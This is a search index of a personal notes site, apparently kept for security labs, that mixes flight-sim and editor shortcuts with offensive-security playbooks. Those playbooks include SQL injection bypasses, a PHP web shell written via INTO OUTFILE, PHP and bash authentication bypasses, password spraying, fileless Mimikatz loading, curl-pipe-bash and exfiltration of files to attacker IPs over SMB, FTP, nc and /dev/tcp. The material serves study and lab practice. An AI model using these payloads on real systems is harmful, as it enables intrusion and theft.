{"searchDocs":[{"title":"General","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs","content":"General This article contains general knowledge and operations about DCS flight sim. Operation\tKeyboardSpeed up time\tCTRL Left + Z Reset time\tShift Left + Z Radio\tÇ Cabin light\tL","keywords":"","version":"Next"},{"title":"Improve shell","type":0,"sectionRef":"#","url":"/docs/playbooks/improve-shell","content":"Improve shell When trying to get Remote Code Execution most of the times we get a non-interactive shell. In order to get a better shell, we could the following commands: python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' export TERM=xterm ctrl + z stty raw -echo; fg You can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/","keywords":"","version":"Next"},{"title":"Useful commands","type":0,"sectionRef":"#","url":"/docs/linux-useful-commands","content":"","keywords":"","version":"Next"},{"title":"Environment variables by variable​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#environment-variables-by-variable","content":" Imagine we need to access the contents of an environment variable, but its name is stored in another variable.  For example:  DEV_AWS_ACCESS_KEY_ID=&quot;1234-dev&quot; RD_AWS_ACCESS_KEY_ID=&quot;abcd-prd&quot;   This could happen for instance while configuring multiple AWS in a CI system.  Let's continue with the example, the CI system provide a variable called &quot;stage&quot;, which can be dev or prd; then we want to prepend the content of this variable to get the credentials to the proper account:  CUR_ENV=`echo ${stage} | tr a-z A-Z` ENV_ACCESS_KEY=&quot;${CUR_ENV}_AWS_ACCESS_KEY_ID&quot;   Now the magic comes, if this the shell is based in bash, we could the technique called as &quot;variable indirection&quot;, like this:  ACTUAL_KEY=echo ${!ENV_ACCESS_KEY}   However, this will not work on all the shells, a more general solution could be:  eval ACTUAL_KEY=\\$$ENV_ACCESS_KEY   However, there might be security implications by using eval  ","version":"Next","tagName":"h2"},{"title":"Check if there are git changes in script​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#check-if-there-are-git-changes-in-script","content":" In a CI pipeline, you might want to check if there are changes to create an automatic commit, etc.  You can do that by running the following snippet:  git diff-index --quiet HEAD ANY_CHANGE=$? [ $ANY_CHANGE -ne 0 ] &amp;&amp; echo &quot;Do something with the change&quot;   ","version":"Next","tagName":"h2"},{"title":"See strings in binary file​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#see-strings-in-binary-file","content":" strings login.php.swp  ","version":"Next","tagName":"h2"},{"title":"Chrome","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Chrome","content":"Chrome Shortcut\tDescriptionNew tab\tCMD + t Next tab\toption + CMD + Arrow right/left Go to tab 1\tCMD + 1 Go to tab 2\tCMD + 2","keywords":"","version":"Next"},{"title":"PHP","type":0,"sectionRef":"#","url":"/docs/languages/php","content":"","keywords":"","version":"Next"},{"title":"Type juggling​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#type-juggling","content":" Due to the nature of PHP we can abuse the type jungling feature. When comparing variables of different types, PHP will convert them to a common, comparable type.  The following condition will be true and print the message.  $example_int = 7 $example_str = &quot;7&quot; if ($example_int == $example_str) { echo(&quot;PHP can compare ints and strings.&quot;) }   An if with == will not check the types. Only === check the types.  If the string to be compared does not contain an integer, it will be converted to 0, e.g:  (&quot;Puppies&quot; == 0) -&gt; True   So, if you see some compraison with PHP is worth trying to exploit this vulnerability  Applying this to the security world, we can bypass auth by using this loose comparison:  if ($_POST[&quot;password&quot;] == &quot;Admin_Password&quot;) {login_as_admin();}   Then, to bypass the auth the user only need to provide 0 integer as input:  (0 == “Admin_Password”) -&gt; True   Reference: https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09  ","version":"Next","tagName":"h2"},{"title":"strcmp​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#strcmp","content":" The strcmp method is also affected by the loose comparison.  if(strcmp($PASSWORD, $_GET['password']) == 0){ $success = true; }   Thanks to the type juggling describe above, if strcmp returns NULL the condition will be true. We can force this by passing the password field as an array:  http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22   Reference: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016 ","version":"Next","tagName":"h2"},{"title":"IntelliJ","type":0,"sectionRef":"#","url":"/docs/Shortcuts/IntelliJ","content":"IntelliJ Shortcut\tDescriptionMove between open projects\toption + CMD + ` Open terminal\toption + fn + F12 Select\toption + Arrow Up/Down Move between words\toption + Arrow Left/Right Fold\tCMD (+) + Unfold\tCMD (+) - Search and replace\tCMD+R + option +A Project structure section\tCMD+1 Run section\tCMD+4 Go to line\tCMD+L See implementations\toption+CMD+B See usages\tCMD+B Move\tF6 Rename\tSHIT + F6 Go to test\tSHIT + CMD + T Recent files\tCMD + E Add breakpoint\tCMD + F8 Run\tCONTROL + SHIFT + R Debug\tCONTROL + SHIFT + D Delete line\tCMD + Erase","keywords":"","version":"Next"},{"title":"Vim","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Vim","content":"","keywords":"","version":"Next"},{"title":"How to​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#how-to","content":" ","version":"Next","tagName":"h2"},{"title":"Add text to multiple lines:​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#add-text-to-multiple-lines","content":" Visual block modeSelect where to changePress IPerform the change in one linePress ESCThe change will propagate ","version":"Next","tagName":"h3"},{"title":"Bash","type":0,"sectionRef":"#","url":"/docs/languages/bash","content":"","keywords":"","version":"Next"},{"title":"Pattern matching comparison​","type":1,"pageTitle":"Bash","url":"/docs/languages/bash#pattern-matching-comparison","content":" This comparisson is making a pattern matching instead of a string equality comparisson.  if [[ $DB_PASS == $USER_PASS ]]; then   This leads to the issue that the user does not need to know the value of DB_PASS to go through this if. If USER_PASS is *, the if will evaluate to true. This leads to a even worse situation, we can brute force the value of the variable by adding characters to the variable, e.g:  a* -&gt; Password succed -&gt; First char is a, let's try next char ... ab* -&gt; Password succeed -&gt; We know the password is ab, etc...  And repeat this process until all chars are revealed. ","version":"Next","tagName":"h2"},{"title":"Mac OS","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Mac OS","content":"Mac OS Shortcut\tDescriptionCurrent application to fullscreen\tcontrol + CMD + F Move between fullscreen apps\tcontrol + Arrow right/left Finder go to folder\tCMD + Shift + G Finder see hidden files\tCMD + Shift + . Finder copy and paste\tCMD + C + CMD + V Finder copy and move\tCMD + C + CMD + option + V","keywords":"","version":"Next"},{"title":"VSCode","type":0,"sectionRef":"#","url":"/docs/Shortcuts/VSCode","content":"VSCode Shortcut\tDescriptionGo to file\tCMD + P Go to terminal\tcontrol + ` Go to editor\tcontrol + 1,2,3,.. Search\tCMD + F Search-replace\toption + CMD + F Fold\tCMD + K + 0 Unfold\tCMD + K + J See all shortcuts\tCMD + K + S Go to explorer\tCMD + shift + e Multi-cursor search\tSelect the term to search and CMD + shift + L Duplicate line\tSHIFT + OPT + arro down","keywords":"","version":"Next"},{"title":"Reference","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs/su25t","content":"","keywords":"","version":"Next"},{"title":"Starting up and take-off​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#starting-up-and-take-off","content":" Operation\tKeyboardCabin light\tL Close cabin\tCtrl Left + C Start/Stop electric power\tShift Right + L Navigation lights\tCtrl Right + L Right engine start\tCtrl Right + Start Left engine start\tAlt Right + Start Take-off/Landing flaps\tShift Left + F Normal flaps\tF Aerodynamic break\tB Landing gear\tG Wheel breaks\tW Radio\tÇ  ","version":"Next","tagName":"h2"},{"title":"Landing​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#landing","content":" Keep vertical speed between 1 and 5 meters  Keep airspeed &lt; 300 kmh  Operation\tKeyboardTake-off/Landing flaps\tShift Left + F Landing gear\tG Wheel breaks\tW Breaking parachute (1 usage only)\tP Right engine stop\tCtrl Right + End Left engine stop\tAlt Right + End  ","version":"Next","tagName":"h2"},{"title":"Navigation​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#navigation","content":" MPW/ENR: Waypoint modeB3B/RTN: Return to base modeMOC/LDNG: Landing mode  Operation\tKeyboard\tNotesNavigation HUD\t1 Next waypoint\tCtrl Left + º AP keep altitude\tAlt Left + 1 or H AP keep altitude and roll\tAlt Left + 2 AP keep level flight\tAlt Left + 3 AP keep radar altitude\tAlt Left + 4\tUseful for very low fligh AP keep barometric altitude\tAlt Left + 5 AP follow route\tAlt Left + 6 or A AP disable any\tAlt Left + 9\t  ","version":"Next","tagName":"h2"},{"title":"Air to ground mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-ground-mode","content":" Operation\tKeyboard\tNotesAir to ground mode\t7\t3MN symbol appears in HUD Change weapon\tD Enable shkival\tO Enable Laser\tShift Right + O\tYou need to remember if the weapon needs laser * Enable Anti-Radar (Fantasmagoria)\tI Discharge amount\tCtrl + backspace Drop interval\tV Gunpod\tC\t  * Check the last letter of the weapon symbol, T means TV, L means laser  ","version":"Next","tagName":"h2"},{"title":"Bombs​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#bombs","content":" There are two modes of dropping an un-guided bomb: https://www.openflightschool.de/mod/book/view.php?id=792  The symbol b appears in the HUD when a bomb is selected.  CCIP​  Continuously Computed Impact Point.  Deep dive into the objective  A vertical line will appear, when the piper is in the objective trigger the joystick  CCRP​  Continuously Computed Release Point.  Flight level and point the piper where you want to drop the bomb.  Press the joystick trigger and keep flying leveled towards the point.  There's a distance indicator in the left side of the HUD, when the indicator reaches the lowest point, the bomb will be released automatically.  ","version":"Next","tagName":"h3"},{"title":"Missiles​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#missiles","content":" Point the skhrval sensor to the target.  Make the reticule smaller as possible and adapt the size of the reticule to the kind of target:  MANPAD: 5mTank: 10mBuilding: 30-60m  When shkrval acquires the lock, you will see NP (Launch authorized).  With the vickr missiles you don't actually need the lock, they will follow the laser. If you spot something before the locking, you can shoot as soon as you are in the required distance.  ","version":"Next","tagName":"h3"},{"title":"Air to air mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-air-mode","content":" Operation\tKeyboard\tNotesAir to air mode\t6\tOTN symbol appears in HUD Gunpod\tC\tPlace the target aircraft in the middle of the symbol wings ","version":"Next","tagName":"h2"},{"title":"SQL injections","type":0,"sectionRef":"#","url":"/docs/playbooks/sqli","content":"","keywords":"","version":"Next"},{"title":"Comments​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#comments","content":" When trying to make the SQL injection, remember that SQL has different comment characters: # and --. Mind the space in the last one, it's better to use -- - char for this kind of escape.  ","version":"Next","tagName":"h2"},{"title":"URL encode​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#url-encode","content":" If you are trying to discover a SQL injection and you fail, remember that you might need to use the URL-encoded characters:  Character\tURL Encoded Character'\t%27 &quot;\t%22 #\t%23 ;\t%3B )\t%29  ","version":"Next","tagName":"h2"},{"title":"Query logic​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#query-logic","content":" Remember you can subvert any query logic by using the AND and OR operators, e.g:  SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';   If you are free to input any value in admin you can ignore the AND:  SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';   Another example, you can just not only ignore the conditions but change them:  SELECT * FROM logins WHERE ((username='admin') AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   username = other')) OR id=5'--  SELECT * FROM logins WHERE ((username='username = other')) OR id=5'--) AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   And you will log-in as user with ID 5  ","version":"Next","tagName":"h2"},{"title":"Union​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#union","content":" You can abuse the SQL injection to extract info from any table using the UNION clause. You just need to know the number of columns.  You can combine the outputs of two tables provided they have the same number of columns.  In order to know the number of columns, you can use the following methods:  Order by: you can pass the number of column to sort by: 1,2,3, keep trying until you got an error. That's the number of columns. Union: similar to the last one but provide the colums to a union query: UNION select 1,2,3. When it fails, you'll know the max number of columns.  This last method provides the benefit that you see in the UI if there are some hidden column.  ","version":"Next","tagName":"h2"},{"title":"Enumerating through SQL injection​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#enumerating-through-sql-injection","content":" You can extract the information in the database via SQL injection. However, first you must know the databases inside, the tables and the structure of them.  No worries, you can make use of the table metadata to obtain this information:  ","version":"Next","tagName":"h2"},{"title":"Databases​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#databases","content":" All available databases  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;   Current database  select 1,database(),2,3-- -   ","version":"Next","tagName":"h3"},{"title":"Tables​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#tables","content":" All available tables in database dev  select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'   ","version":"Next","tagName":"h3"},{"title":"Table columns​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#table-columns","content":" All available columns in table 'credentials'  select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'   ","version":"Next","tagName":"h3"},{"title":"User privileges​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#user-privileges","content":" In certain conditions the user might be authorized to read/write files from the database. First of all you need to know the privileges of the current user:  To know the user running the database:  SELECT 1, user(), 3, 4   Check if the user is a super-user:  SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;   List all privileges of user:  SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot;   ","version":"Next","tagName":"h2"},{"title":"Reading​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#reading","content":" If FILE privilege is granted for the user, you might be able to read any system file from the database engine:  SELECT LOAD_FILE('/etc/passwd'); SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4   This will work provided the user running the database has read access in the OS.  You can use TO_BASE64 function for convinience:  SELECT 1, TO_BASE64(LOAD_FILE(&quot;/var/www/html/config.php&quot;)), 3, 4   And later decode it:  cat /tmp/b.txt | tr -d ' ' | base64 -d &gt; /tmp/b.php   Note that displaying the base64 added some whitespaces which base64 command dislikes. You can use tr to remove those chars.  ","version":"Next","tagName":"h3"},{"title":"Writing​","type":1,"pageTitle":"SQL injections","url":"/docs/playbooks/sqli#writing","content":" There are some requirements to be able to write a file from the database:  FILE privilegeGlobal secure_file_priv variable not enabledThe user running the database must have write access to the destination  You can check the global variable with a query like:  SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;   If the conditions are met, writing to a file is simple:  select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'   Then, you can try more advanced stuff, like writing a web shell:  select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot; into outfile '/var/www/html/shell.php'   The attacker might run this web-shell from http://SERVER_IP:PORT/shell.php?0=id ","version":"Next","tagName":"h3"},{"title":"evil-winrm","type":0,"sectionRef":"#","url":"/docs/tooling/evilwinrm","content":"evil-winrm Once you know the user/password of a Windows target, you can use https://github.com/Hackplayers/evil-winrm to connect to the Powershell. Consider this tool as the PowerShell for Linux. The usage is quite easy: evil-winrm -i 10.129.67.87 -u Administrator -p &lt;password&gt; If you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash: Make sure the file /etc/ssl/openssl.cnf contains the following: [provider_sect] default = default_sect legacy = legacy_sect [default_sect] activate = 1 [legacy_sect] activate = 1 If you see the following error, it means the user is not authorized to use WinRM. It does not mean the user/password are incorrect. Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError ","keywords":"","version":"Next"},{"title":"crackmapexec","type":0,"sectionRef":"#","url":"/docs/tooling/crackmapexec","content":"","keywords":"","version":"Next"},{"title":"Brute-force Sambda users​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#brute-force-sambda-users","content":" Will try to determine the users of a system by trying with different `rid``  crackmapexec smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute 10000   ","version":"Next","tagName":"h2"},{"title":"Password spraying​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#password-spraying","content":" It will try to combine the values in the provided files to see if it returns a valid login attempt  crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users  ","version":"Next","tagName":"h2"},{"title":"Active Directory","type":0,"sectionRef":"#","url":"/docs/playbooks/active-directory","content":"","keywords":"","version":"Next"},{"title":"Users​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#users","content":" Add to the domain   New-ADUser -Name &quot;Orion Starchaser&quot; -Accountpassword (ConvertTo-SecureString -AsPlainText (Read-Host &quot;Enter a secure password&quot;) -Force ) -Enabled $true -OtherAttributes @{'title'=&quot;Analyst&quot;;'mail'=&quot;o.starchaser@inlanefreight.local&quot;} -ChangePasswordAtLogon $true   Add to particular organization unit  New-ADUser -Name &quot;KarimBuzdar&quot; -GivenName &quot;Karim&quot; -Surname &quot;Buzdar&quot; -SamAccountName &quot;kbuzdar&quot; -UserPrincipalName &quot;kbuzdar@faqforge.com&quot; -Path &quot;OU=Users,DC=faqforge,DC=com&quot; -AccountPassword (ConvertTo-SecureString &quot;P@ssw0rd!&quot; -AsPlainText -Force) -Enabled $true   Remove-ADUser -Identity pvalencia   Get a particular user  Get-ADUser -Identity m.ohare   Get all users in organization unit:  Get-ADUser -Filter * -SearchBase &quot;OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM&quot;   Search for user with a filter:  Get-ADUser -Filter 'Name -like &quot;*SvcAccount&quot;' | Format-Table Name,SamAccountName -A   Get all properties:  Get-ADUser -Identity amasters -Properties *   ","version":"Next","tagName":"h2"},{"title":"Unlock account​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#unlock-account","content":" Unlock account:  Unlock-ADAccount -Identity amasters   Set new password:  Set-ADAccountPassword -Identity amasters -NewPassword (ConvertTo-SecureString -AsPlainText &quot;qwert@12345&quot; -Force)   Force change password after next logon:  Set-ADUser -Identity amasters -ChangePasswordAtLogon $true   ","version":"Next","tagName":"h2"},{"title":"Organization unit​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#organization-unit","content":" Create a new OU under some path  New-ADOrganizationalUnit -Name &quot;Analysts&quot; -Path &quot;OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   Move created user to the new created OU  Move-ADObject -Identity a.callisto -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   or by Common name:  Move-ADObject -Identity &quot;CN=a.callisto,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   ","version":"Next","tagName":"h2"},{"title":"Security group​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group","content":" New-ADGroup -Name &quot;Security Analysts&quot; -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName &quot;Security Analysts&quot; -Path &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -Description &quot;Members of this group are Security Analysts under the IT OU&quot;   Add users to the group:  Add-ADGroupMember -Identity analysts -Members ACepheus,OStarchaser,ACallisto   ","version":"Next","tagName":"h2"},{"title":"Security group policy​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group-policy","content":" Get by name:  Get-GPO -Name &quot;Group Policy Test&quot;   Copy and rename GPO (Group policy Object):  Copy-GPO -SourceName &quot;Logon Banner&quot; -TargetName &quot;Security Analysts Control&quot;   Link the GPO to a OU:  New-GPLink -Name &quot;Security Analysts Control&quot; -Target &quot;ou=Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL&quot; -LinkEnabled Yes   To edit the security group policy it's better to do it from the UI, using the Group Policy Management Center (GPMC) available in Server Management &gt; Tools.  ","version":"Next","tagName":"h2"},{"title":"Computer​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#computer","content":" Add a computer to the domain, credentials refer to the user whose credentials we will use to authorize the join:  Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\HTB-student_adm' -Restart   That command must be run from the computer that did not join the domain yet.  You can do the same but remotely:  Add-Computer -ComputerName ACADEMY-IAD-W10 -LocalCredential ACADEMY-IAD-W10\\image -DomainName INLANEFREIGHT.LOCAL -Credential INLANEFREIGHT\\htb-student_adm -Restart   We can we the details of a computer in the domain by running:  Get-ADComputer -Identity &quot;name&quot; -Properties * | select CN,CanonicalName,IPv4Address   You can move the computer to another OU by running:  Move-ADObject -Identity &quot;name&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;  ","version":"Next","tagName":"h2"},{"title":"ffuf","type":0,"sectionRef":"#","url":"/docs/tooling/ffuf","content":"","keywords":"","version":"Next"},{"title":"Fuzzing html pages​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-html-pages","content":" ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html   ","version":"Next","tagName":"h2"},{"title":"Fuzzing sub-domains​","type":1,"pageTitle":"ffuf","url":"/docs/tooling/ffuf#fuzzing-sub-domains","content":" ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devvortex.htb&quot; -u http://devvortex.htb -fl 8  ","version":"Next","tagName":"h2"},{"title":"gdb","type":0,"sectionRef":"#","url":"/docs/tooling/gdb","content":"","keywords":"","version":"Next"},{"title":"gdb-peda​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-peda","content":" Python Exploit Development Assistance for GDB   https://github.com/longld/peda  Create a pattern of 200 chars: pattern_create 200 bof.txtCalculate the number of characters to do buffer overflow: pattern_offset &lt;EIP register&gt;Get assembler code for function: disas &lt;function&gt;. The first line shows the address you must use to jump  ","version":"Next","tagName":"h2"},{"title":"gdb-gef​","type":1,"pageTitle":"gdb","url":"/docs/tooling/gdb#gdb-gef","content":" GDB-Enhaced Features   https://github.com/hugsy/gef  vmmap: show how the memory is organized, very useful to calculate memory offsets:  gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x00555555557000 0x00555555558000 0x00000000002000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time 0x007ffff7d90000 0x007ffff7d93000 0x00000000000000 rw- 0x007ffff7d93000 0x007ffff7dbb000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7dbb000 0x007ffff7f50000 0x00000000028000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7f50000 0x007ffff7fa8000 0x000000001bd000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fa8000 0x007ffff7fac000 0x00000000214000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6 0x007ffff7fac000 0x007ffff7fae000 0x00000000218000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6   spooky_time memory is between address 0x00555555554000 and 0x00555555558000libc memory is between address 0x007ffff7d93000 and 0x007ffff7fae000 ","version":"Next","tagName":"h2"},{"title":"File transfer","type":0,"sectionRef":"#","url":"/docs/playbooks/file-transfer","content":"","keywords":"","version":"Next"},{"title":"Base64 encode/decode​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#base64-encodedecode","content":" If the payload to transmit is small enough, do base64 encode/decode and later check md5 hashes match  base64 -w0 &lt;file&gt; #Encode file base64 -d file #Decode file   ","version":"Next","tagName":"h2"},{"title":"Powershell​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#powershell","content":" Complete reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239  (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')   Fileless method: it does not touch the disk  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')   Upload, powershell does not have a native cmdlet to perform HTTP uploads, however we can install this feature  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts   Upload with base64:  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64   Upload via FTP:  (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')   ","version":"Next","tagName":"h2"},{"title":"Samba​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#samba","content":" Start a impacket samba server on the attacker machine:  sudo impacket-smbserver share -smb2support /tmp/smbshare sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   Note: the folder will not be created automatically, so you might want to create it beforehand.  Then to download a file from the attack machine to the target machine:  copy \\\\192.168.220.133\\share\\nc.exe   Or to upload a file from the target machine to the attack machine  copy upload_win.txt \\\\192.168.220.133\\share   If the samba ports are blocked, it's worth trying with WebDAV which runs SMB over HTTP.  Attacker machine:  sudo pip install wsgidav cheroot sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous   Target machine:  dir \\\\192.168.49.128\\DavWWWRoot copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\   Note: `DavWWWRoot`` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.  You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder  ","version":"Next","tagName":"h2"},{"title":"ftp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#ftp","content":" Start a FTP server in the attacker:  sudo pip3 install pyftpdlib sudo python3 -m pyftpdlib --port 21   By default it will try to run at port 2121, so we need to explicitly say port 21 (and sudo).  At the target machine, we can use powershell cmdlet:  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')   If the shell is not interactive, we'll need to create a file with the FTP commands, e.g.:  C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt C:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt C:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt C:\\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt C:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt C:\\htb&gt; ftp -v -n -s:ftpcommand.txt ftp&gt; open 192.168.49.128 Log in with USER and PASS first. ftp&gt; USER anonymous ftp&gt; GET file.txt ftp&gt; bye C:\\htb&gt;more file.txt This is a test file   ","version":"Next","tagName":"h2"},{"title":"wget​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#wget","content":" wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # fileless wget wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3   ","version":"Next","tagName":"h2"},{"title":"curl​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#curl","content":" curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # fileless curl curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash   ","version":"Next","tagName":"h2"},{"title":"nc​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#nc","content":" nc -lvnp 9002 &gt; SharpKatz.exe #Inside receiver nc -q 0 192.168.49.128 9002 &lt; SharpKatz.exe #In sender   ","version":"Next","tagName":"h2"},{"title":"dev/tcp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#devtcp","content":" As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.  exec 3&lt;&gt;/dev/tcp/10.10.10.32/80 echo -e &quot;GET /LinEnum.sh HTTP/1.1\\n\\n&quot;&gt;&amp;3 cat &lt;&amp;3 cat metabase.db.trace.db &gt; /dev/tcp/10.10.14.102/9002 # Send the file cat &lt; 